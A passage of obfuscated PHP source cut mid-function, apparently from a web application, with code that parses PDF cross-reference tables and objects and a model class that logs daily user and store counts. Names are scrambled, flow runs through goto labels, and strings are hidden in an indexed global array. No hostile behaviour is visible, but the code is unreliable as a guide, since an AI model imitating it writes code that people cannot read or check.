(substr($bë“‘šâ¼›, 0, 2) == $CŞˆŒáÔ[1546]) { $bë“‘šâ¼› = substr($bë“‘šâ¼›, 2, 14); } if (strtotime($bë“‘šâ¼›)) { $bë“‘šâ¼› = date($CŞˆŒáÔ[1547], strtotime($bë“‘šâ¼›)); } break; } $eáòÕ’ÉÆ¸[$e¨íâå³Ş‹] = $bë“‘šâ¼›; } return $eáòÕ’ÉÆ¸; } private static function decodeXref(&$bë¦À´äå‡) { goto B«ÕìÖì–¼; FÉ¤¢ìøƒ: if (preg_match($c¯ëÒÒÔ¾‡[1555], $DÓ‚‹‚™ù, $AÚ¯¶òºÛ²) > 0) { $E†İ¢ÂËÜî[$c¯ëÒÒÔ¾‡[1529]][$c¯ëÒÒÔ¾‡[77]] = intval($AÚ¯¶òºÛ²[1]); } if (preg_match($c¯ëÒÒÔ¾‡[1556], $DÓ‚‹‚™ù, $AÚ¯¶òºÛ²) > 0) { $E†İ¢ÂËÜî[$c¯ëÒÒÔ¾‡[1529]][$c¯ëÒÒÔ¾‡[1557]] = intval($AÚ¯¶òºÛ²[1]) . $c¯ëÒÒÔ¾‡[70] . intval($AÚ¯¶òºÛ²[2]); } if (preg_match($c¯ëÒÒÔ¾‡[1558], $DÓ‚‹‚™ù, $AÚ¯¶òºÛ²) > 0) { $E†İ¢ÂËÜî[$c¯ëÒÒÔ¾‡[1529]][$c¯ëÒÒÔ¾‡[1559]] = intval($AÚ¯¶òºÛ²[1]) . $c¯ëÒÒÔ¾‡[70] . intval($AÚ¯¶òºÛ²[2]); } goto fÛÓ’•³; fÛÓ’•³: if (preg_match($c¯ëÒÒÔ¾‡[1560], $DÓ‚‹‚™ù, $AÚ¯¶òºÛ²) > 0) { $E†İ¢ÂËÜî[$c¯ëÒÒÔ¾‡[1529]][$c¯ëÒÒÔ¾‡[1186]] = intval($AÚ¯¶òºÛ²[1]) . $c¯ëÒÒÔ¾‡[70] . intval($AÚ¯¶òºÛ²[2]); } if (preg_match($c¯ëÒÒÔ¾‡[1561], $DÓ‚‹‚™ù, $AÚ¯¶òºÛ²) > 0) { $E†İ¢ÂËÜî[$c¯ëÒÒÔ¾‡[1529]][$c¯ëÒÒÔ¾‡[367]] = array(); $E†İ¢ÂËÜî[$c¯ëÒÒÔ¾‡[1529]][$c¯ëÒÒÔ¾‡[367]][0] = $AÚ¯¶òºÛ²[1]; $E†İ¢ÂËÜî[$c¯ëÒÒÔ¾‡[1529]][$c¯ëÒÒÔ¾‡[367]][1] = $AÚ¯¶òºÛ²[2]; } if (!$E†İ¢ÂËÜî[$c¯ëÒÒÔ¾‡[1529]][$c¯ëÒÒÔ¾‡[1186]]) { return !1; } goto BÜ¦‰’™¹½; eº’¿ôï‹®: $bøæ¦öš‰Ç = $c¯ëÒÒÔ¾‡[1549]; if (!preg_match_all($bøæ¦öš‰Ç, $Eš¢„Œ¨œ˜, $AÚ¯¶òºÛ², PREG_SET_ORDER, 0)) { return !1; } $eñÌä°ç»Ñ = intval($AÚ¯¶òºÛ²[0][1]); goto d ”‰õŸ’ö; d ”‰õŸ’ö: if ($bë¦À´äå‡[$c¯ëÒÒÔ¾‡[77]] - $eñÌä°ç»Ñ > $bë¦À´äå‡[$c¯ëÒÒÔ¾‡[1526]]) { $e©ŒšŠ“®† = 4 * $bë¦À´äå‡[$c¯ëÒÒÔ¾‡[1526]]; $bë¦À´äå‡[$c¯ëÒÒÔ¾‡[1526]] = $e©ŒšŠ“®†; $bë¦À´äå‡[$c¯ëÒÒÔ¾‡[1527]] = StreamWrapperIO::read($bë¦À´äå‡[$c¯ëÒÒÔ¾‡[75]], 0, $e©ŒšŠ“®†); $bë¦À´äå‡[$c¯ëÒÒÔ¾‡[1528]] = StreamWrapperIO::read($bë¦À´äå‡[$c¯ëÒÒÔ¾‡[75]], $bë¦À´äå‡[$c¯ëÒÒÔ¾‡[77]] - $e©ŒšŠ“®†, $e©ŒšŠ“®†); $Eš¢„Œ¨œ˜ = $bë¦À´äå‡[$c¯ëÒÒÔ¾‡[1528]]; } $cÎ³¬’ŒÌ = 0; preg_match_all($c¯ëÒÒÔ¾‡[1550], $Eš¢„Œ¨œ˜, $AÚ¯¶òºÛ²); goto e‚´ô²½à; B«ÕìÖì–¼: $c¯ëÒÒÔ¾‡ =& $_SERVER[îÖ]; $Eš¢„Œ¨œ˜ = $bë¦À´äå‡[$c¯ëÒÒÔ¾‡[1528]]; $E†İ¢ÂËÜî = array($c¯ëÒÒÔ¾‡[1529] => array(), $c¯ëÒÒÔ¾‡[1548] => array()); goto eº’¿ôï‹®; e‚´ô²½à: foreach ($AÚ¯¶òºÛ²[3] as $bÌ‡ÃÕÏ¬ => $dÊ‘ì…öÃ¹) { if ($AÚ¯¶òºÛ²[3][$bÌ‡ÃÕÏ¬] == $c¯ëÒÒÔ¾‡[1551]) { $eÇŠ‚‰«‡¦ = $cÎ³¬’ŒÌ . $c¯ëÒÒÔ¾‡[70] . intval($AÚ¯¶òºÛ²[2][$bÌ‡ÃÕÏ¬]); $E†İ¢ÂËÜî[$c¯ëÒÒÔ¾‡[1548]][$eÇŠ‚‰«‡¦] = intval($AÚ¯¶òºÛ²[1][$bÌ‡ÃÕÏ¬]); ++$cÎ³¬’ŒÌ; } else { if ($AÚ¯¶òºÛ²[3][$bÌ‡ÃÕÏ¬] == $c¯ëÒÒÔ¾‡[1552]) { ++$cÎ³¬’ŒÌ; } else { } } } if (preg_match_all($c¯ëÒÒÔ¾‡[1553], $Eš¢„Œ¨œ˜, $AÚ¯¶òºÛ²)) { $AË÷…òº…¼ = $bë¦À´äå‡[$c¯ëÒÒÔ¾‡[77]] - $bë¦À´äå‡[$c¯ëÒÒÔ¾‡[1526]]; foreach ($AÚ¯¶òºÛ²[0] as $bÌ‡ÃÕÏ¬ => $a¨ßä’ßà) { $D­÷ïôÓÁ‡ = $AÚ¯¶òºÛ²[1][$bÌ‡ÃÕÏ¬] . $c¯ëÒÒÔ¾‡[70] . $AÚ¯¶òºÛ²[2][$bÌ‡ÃÕÏ¬]; $E†İ¢ÂËÜî[$c¯ëÒÒÔ¾‡[1548]][$D­÷ïôÓÁ‡] = strpos($Eš¢„Œ¨œ˜, $a¨ßä’ßà) + $AË÷…òº…¼ + 1; } } if (preg_match_all($c¯ëÒÒÔ¾‡[1554], $Eš¢„Œ¨œ˜, $AÚ¯¶òºÛ²)) { $DÓ‚‹‚™ù = count($AÚ¯¶òºÛ²[1]) == 1 ? $AÚ¯¶òºÛ²[1][0] : $AÚ¯¶òºÛ²[1][1]; } else { $DÓ‚‹‚™ù = substr($Eš¢„Œ¨œ˜, -1024 * 5); } goto FÉ¤¢ìøƒ; BÜ¦‰’™¹½: if (preg_match($c¯ëÒÒÔ¾‡[1562], $DÓ‚‹‚™ù, $AÚ¯¶òºÛ²) > 0) { } return $E†İ¢ÂËÜî; goto D†Ò¼¥¡Äğ; D†Ò¼¥¡Äğ: } private static function getObjectValue($FÑÍùª¸, $A’¿î†ÚáÍ, $eù¥±ôÅé„) { goto C¨„¨Ş×¥; FÖ³°Îâ©ö: return $D»‰»ÛŒˆ; goto F‹¬ÒµÔ¼; a¥š‰© ‰Ï: if (!is_array($F¢Ûê›ÄàÍ[1])) { return array(); } $D»‰»ÛŒˆ = array(); for ($Fß†«ø®¬ = 0; $Fß†«ø®¬ < count($F¢Ûê›ÄàÍ[1]); $Fß†«ø®¬ += 2) { $D»„íÏùì = $F¢Ûê›ÄàÍ[1][$Fß†«ø®¬]; $fï»àªøÌ = $F¢Ûê›ÄàÍ[1][$Fß†«ø®¬ + 1]; if (count($D»„íÏùì) == 3 && $D»„íÏùì[0] == $eñˆøˆ‘‘[8]) { $d„ãˆƒ¤«Ò = !1; if ($fï»àªøÌ[0] == $eñˆøˆ‘‘[1563]) { $fï»àªøÌ = self::getObject($FÑÍùª¸, $A’¿î†ÚáÍ[$eñˆøˆ‘‘[1548]][$fï»àªøÌ[1]]); } $d„ãˆƒ¤«Ò = $fï»àªøÌ[1]; if ($d„ãˆƒ¤«Ò === !1) { continue; } if (is_string($d„ãˆƒ¤«Ò)) { $d„ãˆƒ¤«Ò = self::decodeStr($d„ãˆƒ¤«Ò); } $D»‰»ÛŒˆ[$D»„íÏùì[1]] = $d„ãˆƒ¤«Ò; } } goto FÖ³°Îâ©ö; C¨„¨Ş×¥: $eñˆøˆ‘‘ =& $_SERVER[îÖ]; $F¢Ûê›ÄàÍ = self::getObject($FÑÍùª¸, $A’¿î†ÚáÍ[$eñˆøˆ‘‘[1548]][$eù¥±ôÅé„]); if (is_string($F¢Ûê›ÄàÍ[1])) { return $F¢Ûê›ÄàÍ[1]; } goto a¥š‰© ‰Ï; F‹¬ÒµÔ¼: } private static function getObject($b»Ê‰õ©°, $DËœïƒ‰Ê) { $CÈèé¦íØñ = self::getObjectItem($b»Ê‰õ©°, $DËœïƒ‰Ê); $CÈèé¦íØñ = self::getObjectItem($b»Ê‰õ©°, $CÈèé¦íØñ[2]); return $CÈèé¦íØñ; } private static function getObjectItem($D‰İØ§íÚÙ, $c™™ÓÉÔ‚) { goto E‡‹Ì«çÌœ; e‹ÂÉ¿·ˆ: $eÙ‘½¨º§ = self::getRawObject($C…ìöÅØå, $A¦Ô…Œ‡ƒ); if ($c™™ÓÉÔ‚ >= $Fá¬ô‚¹ëğ) { $eÙ‘½¨º§[2] = $eÙ‘½¨º§[2] + $Fá¬ô‚¹ëğ; } else { if ($c™™ÓÉÔ‚ > $Cì¯¶©¸‰ && $c™™ÓÉÔ‚ <= $Fá¬ô‚¹ëğ) { $eÙ‘½¨º§[2] = $eÙ‘½¨º§[2] + $c™™ÓÉÔ‚; } } return $eÙ‘½¨º§; goto CÎĞá¢»ôÂ; aÕ¦„Èåé”: $A¦Ô…Œ‡ƒ = $c™™ÓÉÔ‚ >= $Fá¬ô‚¹ëğ ? $c™™ÓÉÔ‚ - $Fá¬ô‚¹ëğ : $c™™ÓÉÔ‚; $C…ìöÅØå = $c™™ÓÉÔ‚ >= $Fá¬ô‚¹ëğ ? $D‰İØ§íÚÙ[$e¡ª¡¾Á®[1528]] : $D‰İØ§íÚÙ[$e¡ª¡¾Á®[1527]]; if ($c™™ÓÉÔ‚ > $Cì¯¶©¸‰ && $c™™ÓÉÔ‚ <= $Fá¬ô‚¹ëğ) { $A¦Ô…Œ‡ƒ = 0; $C…ìöÅØå = StreamWrapperIO::read($D‰İØ§íÚÙ[$e¡ª¡¾Á®[75]], $c™™ÓÉÔ‚, $Cì¯¶©¸‰); } goto e‹ÂÉ¿·ˆ; E‡‹Ì«çÌœ: $e¡ª¡¾Á® =& $_SERVER[îÖ]; $Cì¯¶©¸‰ = $D‰İØ§íÚÙ[$e¡ª¡¾Á®[1526]]; $Fá¬ô‚¹ëğ = $D‰İØ§íÚÙ[$e¡ª¡¾Á®[77]] - $Cì¯¶©¸‰; goto aÕ¦„Èåé”; CÎĞá¢»ôÂ: } private static function decodeStr($bÀ¦¶¡Éñ) { goto DÇàËèù¹‹; dÅÉÅš­¼: return $bÀ¦¶¡Éñ; goto fïÔ‹Õ³¥ò; DÇàËèù¹‹: $B›·ªÙ´°Ò =& $_SERVER[îÖ]; $bÀ¦¶¡Éñ = str_replace(array($B›·ªÙ´°Ò[1564], $B›·ªÙ´°Ò[1565], $B›·ªÙ´°Ò[1566], $B›·ªÙ´°Ò[1567], $B›·ªÙ´°Ò[1568], $B›·ªÙ´°Ò[1569], $B›·ªÙ´°Ò[1570], $B›·ªÙ´°Ò[1571]), array($B›·ªÙ´°Ò[93], $B›·ªÙ´°Ò[50], $B›·ªÙ´°Ò[8], $B›·ªÙ´°Ò[248], $B›·ªÙ´°Ò[811], $B›·ªÙ´°Ò[217], $B›·ªÙ´°Ò[986], $B›·ªÙ´°Ò[330]), $bÀ¦¶¡Éñ); $Aœ¡…àäáÊ = preg_split($B›·ªÙ´°Ò[1572], $bÀ¦¶¡Éñ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto B½ØÕ¦‘É¿; fö¨ŒÎòÀ‰: $bÀ¦¶¡Éñ = $B›·ªÙ´°Ò[33]; foreach ($Aœ¡…àäáÊ as $AÖˆÏ²‚Ò›) { if (preg_match($B›·ªÙ´°Ò[1578], $AÖˆÏ²‚Ò›) && !1 === stripos($AÖˆÏ²‚Ò›, $B›·ªÙ´°Ò[1579])) { $AÖˆÏ²‚Ò› = preg_replace($B›·ªÙ´°Ò[1580], $B›·ªÙ´°Ò[33], $AÖˆÏ²‚Ò›); $AÖˆÏ²‚Ò› = trim($AÖˆÏ²‚Ò›, $B›·ªÙ´°Ò[920]); $AÖˆÏ²‚Ò› = pack($B›·ªÙ´°Ò[1581], $AÖˆÏ²‚Ò›); $bÀ¦¶¡Éñ .= $AÖˆÏ²‚Ò›; } else { $bÀ¦¶¡Éñ .= $AÖˆÏ²‚Ò›; } } if (preg_match($B›·ªÙ´°Ò[1582], $bÀ¦¶¡Éñ)) { $A ãµî§Ü = substr($bÀ¦¶¡Éñ, 2); $bÀ¦¶¡Éñ = $B›·ªÙ´°Ò[33]; $eàÖ¤¸åë = strlen($A ãµî§Ü); for ($Eåäˆ³âà¿ = 0; $Eåäˆ³âà¿ < $eàÖ¤¸åë; $Eåäˆ³âà¿ += 2) { $B›ŒÓ„—‘ = hexdec(bin2hex(substr($A ãµî§Ü, $Eåäˆ³âà¿, 2))); $bÀ¦¶¡Éñ .= mb_convert_encoding($B›·ªÙ´°Ò[1583] . intval($B›ŒÓ„—‘) . $B›·ªÙ´°Ò[67], $B›·ªÙ´°Ò[1584], $B›·ªÙ´°Ò[1585]); } } goto dÅÉÅš­¼; d»âö…‚: $bÀ¦¶¡Éñ = $B›·ªÙ´°Ò[33]; foreach ($Aœ¡…àäáÊ as $AÖˆÏ²‚Ò›) { if (preg_match($B›·ªÙ´°Ò[1575], $AÖˆÏ²‚Ò›)) { $bÀ¦¶¡Éñ .= \chr(hexdec(trim($AÖˆÏ²‚Ò›, $B›·ªÙ´°Ò[1576]))); } else { $bÀ¦¶¡Éñ .= $AÖˆÏ²‚Ò›; } } $Aœ¡…àäáÊ = preg_split($B›·ªÙ´°Ò[1577], $bÀ¦¶¡Éñ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto fö¨ŒÎòÀ‰; B½ØÕ¦‘É¿: $bÀ¦¶¡Éñ = $B›·ªÙ´°Ò[33]; foreach ($Aœ¡…àäáÊ as $AÖˆÏ²‚Ò›) { if (preg_match($B›·ªÙ´°Ò[1573], $AÖˆÏ²‚Ò›)) { $bÀ¦¶¡Éñ .= \chr(octdec(trim($AÖˆÏ²‚Ò›, $B›·ªÙ´°Ò[93]))); } else { $bÀ¦¶¡Éñ .= $AÖˆÏ²‚Ò›; } } $Aœ¡…àäáÊ = preg_split($B›·ªÙ´°Ò[1574], $bÀ¦¶¡Éñ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto d»âö…‚; fïÔ‹Õ³¥ò: } private static function getRawObject($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ = 0) { goto eÇ¶”–ò‘‹; cšê‰öÚï: $eï÷‰ÆİÃ += strspn($CÀ¡ïˆ´Â·, $d£ØÏÅÎäÆ[1586], $eï÷‰ÆİÃ); $Bç ï«±ä = $CÀ¡ïˆ´Â·[$eï÷‰ÆİÃ]; switch ($Bç ï«±ä) { case $d£ØÏÅÎäÆ[1587]: $C©ÈÁ¡¬¾ = strcspn($CÀ¡ïˆ´Â·, $d£ØÏÅÎäÆ[1588], $eï÷‰ÆİÃ); if ($C©ÈÁ¡¬¾ > 0) { $eï÷‰ÆİÃ += $C©ÈÁ¡¬¾; return self::getRawObject($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ); } break; case $d£ØÏÅÎäÆ[8]: $F¾»°İùäÄ = $Bç ï«±ä; ++$eï÷‰ÆİÃ; $eß§µÚ¾”ƒ = preg_match($d£ØÏÅÎäÆ[1589], substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, 256), $cõ‚ÆÛîÈ›); if (1 == $eß§µÚ¾”ƒ) { $föß©‡«¦Ş = $cõ‚ÆÛîÈ›[1]; $eï÷‰ÆİÃ += strlen($föß©‡«¦Ş); } break; case $d£ØÏÅÎäÆ[248]: case $d£ØÏÅÎäÆ[811]: $F¾»°İùäÄ = $Bç ï«±ä; ++$eï÷‰ÆİÃ; $cŒ·ŒÈù = $eï÷‰ÆİÃ; if ($d£ØÏÅÎäÆ[248] == $Bç ï«±ä) { $C¸ºÕ’‡çË = 1; while ($C¸ºÕ’‡çË > 0) { if (!isset($CÀ¡ïˆ´Â·[$cŒ·ŒÈù])) { break; } $A÷¦•îô³ = $CÀ¡ïˆ´Â·[$cŒ·ŒÈù]; switch ($A÷¦•îô³) { case $d£ØÏÅÎäÆ[93]: ++$cŒ·ŒÈù; break; case $d£ØÏÅÎäÆ[248]: ++$C¸ºÕ’‡çË; break; case $d£ØÏÅÎäÆ[811]: --$C¸ºÕ’‡çË; break; } ++$cŒ·ŒÈù; } $föß©‡«¦Ş = substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, $cŒ·ŒÈù - $eï÷‰ÆİÃ - 1); $eï÷‰ÆİÃ = $cŒ·ŒÈù; } break; case $d£ØÏÅÎäÆ[157]: case $d£ØÏÅÎäÆ[476]: $F¾»°İùäÄ = $Bç ï«±ä; ++$eï÷‰ÆİÃ; if ($d£ØÏÅÎäÆ[157] == $Bç ï«±ä) { $föß©‡«¦Ş = array(); do { $F‹‹¨è–º‹ = $eï÷‰ÆİÃ; $bœØÛôâ‡² = self::getRawObject($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ); $eï÷‰ÆİÃ = $bœØÛôâ‡²[2]; $föß©‡«¦Ş[] = $bœØÛôâ‡²; } while ($d£ØÏÅÎäÆ[476] != $bœØÛôâ‡²[0] && $eï÷‰ÆİÃ != $F‹‹¨è–º‹); array_pop($föß©‡«¦Ş); } break; case $d£ØÏÅÎäÆ[919]: case $d£ØÏÅÎäÆ[922]: if (isset($CÀ¡ïˆ´Â·[$eï÷‰ÆİÃ + 1]) && $CÀ¡ïˆ´Â·[$eï÷‰ÆİÃ + 1] == $Bç ï«±ä) { $F¾»°İùäÄ = $Bç ï«±ä . $Bç ï«±ä; $eï÷‰ÆİÃ += 2; if ($d£ØÏÅÎäÆ[919] == $Bç ï«±ä) { $föß©‡«¦Ş = array(); do { $F‹‹¨è–º‹ = $eï÷‰ÆİÃ; $bœØÛôâ‡² = self::getRawObject($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ); $eï÷‰ÆİÃ = $bœØÛôâ‡²[2]; $föß©‡«¦Ş[] = $bœØÛôâ‡²; } while ($d£ØÏÅÎäÆ[1590] != $bœØÛôâ‡²[0] && $eï÷‰ÆİÃ != $F‹‹¨è–º‹); array_pop($föß©‡«¦Ş); } } else { $F¾»°İùäÄ = $Bç ï«±ä; ++$eï÷‰ÆİÃ; $eß§µÚ¾”ƒ = preg_match($d£ØÏÅÎäÆ[1591], substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ), $cõ‚ÆÛîÈ›); if ($d£ØÏÅÎäÆ[919] == $Bç ï«±ä && 1 == $eß§µÚ¾”ƒ) { $föß©‡«¦Ş = strtr($cõ‚ÆÛîÈ›[1], $d£ØÏÅÎäÆ[1592], $d£ØÏÅÎäÆ[33]); $eï÷‰ÆİÃ += \strlen($cõ‚ÆÛîÈ›[0]); } elseif (!1 !== ($dÊèÀ¿£ˆÌ = strpos($CÀ¡ïˆ´Â·, $d£ØÏÅÎäÆ[922], $eï÷‰ÆİÃ))) { $eï÷‰ÆİÃ = $dÊèÀ¿£ˆÌ + 1; } } break; default: if ($d£ØÏÅÎäÆ[1593] == substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, 6)) { $F¾»°İùäÄ = $d£ØÏÅÎäÆ[1593]; $eï÷‰ÆİÃ += 6; } elseif ($d£ØÏÅÎäÆ[99] == substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, 4)) { $F¾»°İùäÄ = $d£ØÏÅÎäÆ[99]; $eï÷‰ÆİÃ += 4; $föß©‡«¦Ş = $d£ØÏÅÎäÆ[99]; } elseif ($d£ØÏÅÎäÆ[1594] == substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, 4)) { $F¾»°İùäÄ = $d£ØÏÅÎäÆ[1595]; $eï÷‰ÆİÃ += 4; $föß©‡«¦Ş = $d£ØÏÅÎäÆ[1594]; } elseif ($d£ØÏÅÎäÆ[1596] == substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, 5)) { $F¾»°İùäÄ = $d£ØÏÅÎäÆ[1595]; $eï÷‰ÆİÃ += 5; $föß©‡«¦Ş = $d£ØÏÅÎäÆ[1596]; } elseif ($d£ØÏÅÎäÆ[1597] == substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, 6)) { $F¾»°İùäÄ = $d£ØÏÅÎäÆ[1597]; $eï÷‰ÆİÃ += 6; if (1 == preg_match($d£ØÏÅÎäÆ[1598], substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ), $cõ‚ÆÛîÈ›)) { $eï÷‰ÆİÃ += strlen($cõ‚ÆÛîÈ›[0]); $D±Š„êğ£ù = $d£ØÏÅÎäÆ[1599]; $eß§µÚ¾”ƒ = preg_match($D±Š„êğ£ù, substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ), $cõ‚ÆÛîÈ›, PREG_OFFSET_CAPTURE); if (1 == $eß§µÚ¾”ƒ) { $föß©‡«¦Ş = substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, $cõ‚ÆÛîÈ›[0][1]); $eï÷‰ÆİÃ += $cõ‚ÆÛîÈ›[1][1]; } } } elseif ($d£ØÏÅÎäÆ[1600] == substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, 9)) { $F¾»°İùäÄ = $d£ØÏÅÎäÆ[1600]; $eï÷‰ÆİÃ += 9; } elseif (1 == preg_match($d£ØÏÅÎäÆ[1601], substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, 33), $cõ‚ÆÛîÈ›)) { $F¾»°İùäÄ = $d£ØÏÅÎäÆ[1563]; $eï÷‰ÆİÃ += strlen($cõ‚ÆÛîÈ›[0]); $föß©‡«¦Ş = intval($cõ‚ÆÛîÈ›[1]) . $d£ØÏÅÎäÆ[70] . intval($cõ‚ÆÛîÈ›[2]); } elseif (1 == preg_match($d£ØÏÅÎäÆ[1602], substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, 33), $cõ‚ÆÛîÈ›)) { $F¾»°İùäÄ = $d£ØÏÅÎäÆ[1603]; $föß©‡«¦Ş = intval($cõ‚ÆÛîÈ›[1]) . $d£ØÏÅÎäÆ[70] . intval($cõ‚ÆÛîÈ›[2]); $eï÷‰ÆİÃ += strlen($cõ‚ÆÛîÈ›[0]); } elseif (($EË‹ÓÚó…Í = strspn($CÀ¡ïˆ´Â·, $d£ØÏÅÎäÆ[1604], $eï÷‰ÆİÃ)) > 0) { $F¾»°İùäÄ = $d£ØÏÅÎäÆ[1605]; $föß©‡«¦Ş = substr($CÀ¡ïˆ´Â·, $eï÷‰ÆİÃ, $EË‹ÓÚó…Í); $eï÷‰ÆİÃ += $EË‹ÓÚó…Í; } break; } goto cäÅ‘¹£¢Î; eÇ¶”–ò‘‹: $d£ØÏÅÎäÆ =& $_SERVER[îÖ]; $F¾»°İùäÄ = $d£ØÏÅÎäÆ[33]; $föß©‡«¦Ş = $d£ØÏÅÎäÆ[33]; goto cšê‰öÚï; cäÅ‘¹£¢Î: return array($F¾»°İùäÄ, $föß©‡«¦Ş, $eï÷‰ÆİÃ); goto DÚšÊå‘ã¯; DÚšÊå‘ã¯: } } goto cºé•‹î; cÚÄÄ¯‚õ: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($FÑ½œÎÊ¨Î) { $F¦«¯•‚Ê =& $_SERVER[îÖ]; $d¡Òİ– æ¸ = array($F¦«¯•‚Ê[535] => array($F¦«¯•‚Ê[29] => $F¦«¯•‚Ê[2024], $F¦«¯•‚Ê[261] => array($F¦«¯•‚Ê[210], $F¦«¯•‚Ê[699], $F¦«¯•‚Ê[2025], $F¦«¯•‚Ê[2026])), $F¦«¯•‚Ê[2027] => array($F¦«¯•‚Ê[29] => $F¦«¯•‚Ê[2028], $F¦«¯•‚Ê[261] => array($F¦«¯•‚Ê[210], $F¦«¯•‚Ê[697], $F¦«¯•‚Ê[2029], $F¦«¯•‚Ê[2030], $F¦«¯•‚Ê[2031]))); if (!isset($d¡Òİ– æ¸[$FÑ½œÎÊ¨Î])) { return !1; } $this->optionType = $d¡Òİ– æ¸[$FÑ½œÎÊ¨Î][$F¦«¯•‚Ê[29]]; $this->field = $d¡Òİ– æ¸[$FÑ½œÎÊ¨Î][$F¦«¯•‚Ê[261]]; return !0; } public function listData($eŒìŒ´ìòï = false, $A¥‘§ãŒ¬Ï = "\x6d\x6f\144\151\x66\171\x54\x69\155\145", $C‚ëİ¹¶¢‹ = false) { return parent::listData($eŒìŒ´ìòï, $A¥‘§ãŒ¬Ï, $C‚ëİ¹¶¢‹); } public function trendList($aö´Ô¼ˆ¨») { goto B­¤òìõ­; bì°çç’Ÿğ: foreach ($A‡˜²Îõ¥ as $FÂƒ§ˆ¾§Á) { $this->{$D½ÅªÃÓíö}($FÂƒ§ˆ¾§Á); } return $this->listData(); goto eùªäŸÂÖñ; F²·ğãÜ‘: if (!isset($Fˆ¯®·ò•¦)) { $EÖÈŠÕÛÄô = $aö´Ô¼ˆ¨» == $A‡´’²ø[535] ? $A‡´’²ø[477] : $A‡´’²ø[752]; $Fˆ¯®·ò•¦ = Model($EÖÈŠÕÛÄô)->min($A‡´’²ø[187]); } $D½ÅªÃÓíö = $A‡´’²ø[2034] . ucfirst($aö´Ô¼ˆ¨»); $A‡˜²Îõ¥ = $this->dateList($Fˆ¯®·ò•¦); goto bì°çç’Ÿğ; B­¤òìõ­: $A‡´’²ø =& $_SERVER[îÖ]; $b‘çìŒ¡å = $this->listData(); if ($b‘çìŒ¡å) { $aÚŸ‹Áèáà = end($b‘çìŒ¡å); $FÂƒ§ˆ¾§Á = date($A‡´’²ø[2032], strtotime($A‡´’²ø[2033])); if ($aÚŸ‹Áèáà[$A‡´’²ø[210]] == $FÂƒ§ˆ¾§Á) { return $b‘çìŒ¡å; } $Fˆ¯®·ò•¦ = strtotime($aÚŸ‹Áèáà[$A‡´’²ø[210]]); } goto F²·ğãÜ‘; eùªäŸÂÖñ: } private function dateList($eÀ¤äÊÎÇ°) { $a´Ğ÷Ë¿Ú =& $_SERVER[îÖ]; $e©Œ‰»àïì = $eÀ¤äÊÎÇ°; $b¢ßÅÍ’ = strtotime($a´Ğ÷Ë¿Ú[2033]); $fËŸÄ¡¶ù¾ = array(); while ($e©Œ‰»àïì <= $b¢ßÅÍ’) { $fËŸÄ¡¶ù¾[] = date($a´Ğ÷Ë¿Ú[2032], $e©Œ‰»àïì); $e©Œ‰»àïì = strtotime($a´Ğ÷Ë¿Ú[2035], $e©Œ‰»àïì); } return $fËŸÄ¡¶ù¾; } public function _recordUser($Bƒ‚šªĞ¶É = '') { goto Cí¶ŒÂàÄ‚; fÃùÍİ·ÂĞ: $fäá‡²ÀĞ’ = Model($FÜç–çôÀë[477])->where($fŠ£‚ï£Í±)->count($FÜç–çôÀë[1431]); $fŠ£‚ï£Í±[$FÜç–çôÀë[29]] = $FÜç–çôÀë[2038]; $FÇĞ‹èÊñ¨ = Model($FÜç–çôÀë[2039])->where($fŠ£‚ï£Í±)->count($FÜç–çôÀë[2040]); goto Aµ½±ÚÖ¼; bÙãŸøéó±: $fŠ£‚ï£Í± = array($FÜç–çôÀë[187] => array($FÜç–çôÀë[921], $a†É¢‰ó»×)); $a«¦Œ†Èˆ = Model($FÜç–çôÀë[477])->where($fŠ£‚ï£Í±)->count($FÜç–çôÀë[1431]); $fŠ£‚ï£Í±[$FÜç–çôÀë[187]] = array($FÜç–çôÀë[321], array($a¯Ş›øŠ‚¹, $a†É¢‰ó»×)); goto fÃùÍİ·ÂĞ; Aµ½±ÚÖ¼: $C¡¼ì Ùº = array($FÜç–çôÀë[210] => $Bƒ‚šªĞ¶É, $FÜç–çôÀë[699] => (int) $a«¦Œ†Èˆ, $FÜç–çôÀë[2025] => (int) $fäá‡²ÀĞ’, $FÜç–çôÀë[2026] => (int) $FÇĞ‹èÊñ¨); return $this->insert($C¡¼ì Ùº); goto cƒ­°åçÇ‡; Cí¶ŒÂàÄ‚: $FÜç–çôÀë =& $_SERVER[îÖ]; $a¯Ş›øŠ‚¹ = strtotime(date($FÜç–çôÀë[2036], strtotime($Bƒ‚šªĞ¶É))); $a†É¢‰ó»× = strtotime(date($FÜç–çôÀë[2037], strtotime($Bƒ‚šªĞ¶É))); goto bÙãŸøéó±; cƒ­°åçÇ‡: } public function _recordStore($BÅ‡ğÆ“êÙ = '') { goto FŸÍˆ¸´“; d­ŞÜ›¶ñß: $B¥å¦×›³å[$C‚ˆ…ñÉøÈ[371]] = 1; $FéŠË¸ÌÖ´ = Model($C‚ˆ…ñÉøÈ[752])->where($B¥å¦×›³å)->sum($C‚ˆ…ñÉøÈ[77]); $B¥å¦×›³å[$C‚ˆ…ñÉøÈ[371]] = 2; goto aÁÅ•ßã¿; FŸÍˆ¸´“: $C‚ˆ…ñÉøÈ =& $_SERVER[îÖ]; $DÎ¬ôÏ½„ì = strtotime(date($C‚ˆ…ñÉøÈ[2037], strtotime($BÅ‡ğÆ“êÙ))); 